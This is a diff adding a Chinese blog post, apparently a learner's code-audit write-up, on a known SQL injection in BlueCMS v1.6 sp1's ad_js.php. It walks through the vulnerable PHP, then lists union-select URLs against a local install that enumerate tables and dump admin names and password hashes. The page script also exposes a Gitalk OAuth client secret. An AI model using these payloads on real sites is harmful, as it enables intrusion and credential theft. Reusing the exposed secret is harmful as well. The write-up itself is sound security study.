@@ -1,0 +1,272 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>代码审计--SQL注入漏洞实例 | 学习之路</title>
+<meta name="description" content="一个人的学习历程">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://Fzz2.github.io/favicon.ico?v=1556551126723">
+<link rel="stylesheet" href="https://Fzz2.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://Fzz2.github.io">
+        <img class="avatar" src="https://Fzz2.github.io/images/avatar.png?v=1556551126723" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://Fzz2.github.io">
+        <h1 class="site-title">学习之路</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">代码审计--SQL注入漏洞实例</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2019-04-29</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://Fzz2.github.io/tag/sql_inject">
+                    sql注入
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://Fzz2.github.io/tag/code_audit">
+                    代码审计
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>学习了审计sql注入漏洞，当然要去实践一下，毕竟纸上得来终觉浅，要想学好代码审计就必须要实践。由于本小菜刚刚开始学习，所以也是找的已爆出的漏洞为例子，借用seay法师的代码审计工具进行审计。这里审计的是<code>BlueCms v1.6 sp1</code>的sql注入漏洞。</p>
+<h4 id="sql注入漏洞">sql注入漏洞</h4>
+<p>将cms的源码导入到审计工具中，发现第一个注入在<code>ad_js.php</code>中，定位到的语句为：</p>
+<pre><code class="language-php">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table('ad').&quot; WHERE ad_id =&quot;.$ad_id);
+</code></pre>
+<p>首先查看这个文件，发现这个文件包含了<code>/include/common.inc.php</code>,跟进这个文件查看，发现如果没有开启<code>gpc</code>，就对<code>POST GET COOKIE REQUEST</code>提交的参数使用<code>deep_addslashes()</code>函数进行过滤，代码如下：</p>
+<pre><code class="language-php">if(!get_magic_quotes_gpc())
+{
+	$_POST = deep_addslashes($_POST);
+	$_GET = deep_addslashes($_GET);
+	$_COOKIES = deep_addslashes($_COOKIES);
+	$_REQUEST = deep_addslashes($_REQUEST);
+}
+</code></pre>
+<p><code>deep_addslashes</code>函数在<code>include/common.fun.php</code>中，跟进文件，发现其实使用<code>addslashes</code>函数对参数进行的过滤。代码如下：</p>
+<pre><code class="language-php">function deep_addslashes($str)
+{
+	if(is_array($str))
+	{
+		foreach($str as $key=&gt;$val)
+		{
+			$str[$key] = deep_addslashes($val);
+		}
+	}
+	else
+	{
+		$str = addslashes($str);
+	}
+	return $str;
+}
+</code></pre>
+<p>再回看注入点，此处是不需要单引号或者双引号闭合的，这里又直接将参数拼接到sql语句中，所以就产生了注入漏洞。</p>
+<p>参数<code>$ad_id</code>是由get方式传递的，代码如下：</p>
+<pre><code class="language-php">//empty() 函数用于检查一个变量是否为空
+//trim() 函数移除字符串两侧的空白字符或其他预定义字符
+$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
+</code></pre>
+<p>这里先判断参数是否为空，如果不为空再使用<code>trim()</code>函数过滤掉空白字符。查询结果是经过一系列判断后输出到了html的代码注释中，代码如下：</p>
+<pre><code class="language-php">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table('ad').&quot; WHERE ad_id =&quot;.$ad_id);
+if($ad['time_set'] == 0)
+{
+	$ad_content = $ad['content'];
+}
+else
+{
+	if($ad['end_time'] &lt; time())
+	{
+		$ad_content = $ad['exp_content'];
+	}
+	else
+	{
+		$ad_content = $ad['content'];
+	}
+}
+$ad_content = str_replace('&quot;', '\&quot;',$ad_content);
+$ad_content = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$ad_content);
+$ad_content = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$ad_content);
+echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;
+</code></pre>
+<p>综合以上的分析，可以利用<code>union</code>注入进行漏洞的验证。</p>
+<h5 id="获取列数">获取列数</h5>
+<pre><code class="language-sql">view-source:http://127.0.0.1/cms/bluecms_v1.6_sp1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,7
+</code></pre>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1g2jnhu0kiij31xw0c8gmk.jpg" alt="">
+这里可以在第七个字段获取数据。</p>
+<h5 id="获取表名">获取表名</h5>
+<pre><code class="language-sql">view-source:http://127.0.0.1/cms/bluecms_v1.6_sp1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
+</code></pre>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g2jno6ag08j32kc0ac404.jpg" alt=""></p>
+<h5 id="获取blue_admin表的字段">获取blue_admin表的字段</h5>
+<pre><code class="language-sql">view-source:http://127.0.0.1/cms/bluecms_v1.6_sp1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x626c75655f61646d696e
+</code></pre>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g2jns7g4zvj32co06qdgs.jpg" alt=""></p>
+<h5 id="获取用户名密码">获取用户名密码</h5>
+<pre><code class="language-sql">view-source:http://127.0.0.1/cms/bluecms_v1.6_sp1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(admin_name,0x3a,pwd)%20from%20blue_admin
+</code></pre>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1g2jnuq34kuj31je086gma.jpg" alt=""></p>
+<p>第一次尝试写分析文章，思路可能比较乱，但只要坚持下来，一定可以做好的。</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://Fzz2.github.io/post/v5r7rC63n">
+              <h3 class="post-title">
+                下一篇：代码审计--SQL注入漏洞
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+        
+          <div id="gitalk-container"></div>
+        
+
+        
+      
+
+      <div class="site-footer">
+  <div class="slogan">一个人的学习历程</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1ce8a8569a1187754079',
+        clientSecret: '321f1af0d2d56f3d649f925f33f6287e71bdcbf0',
+        repo: 'Fzz2.github.io',
+        owner: 'Fzz2',
+        admin: ['Fzz2'],
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
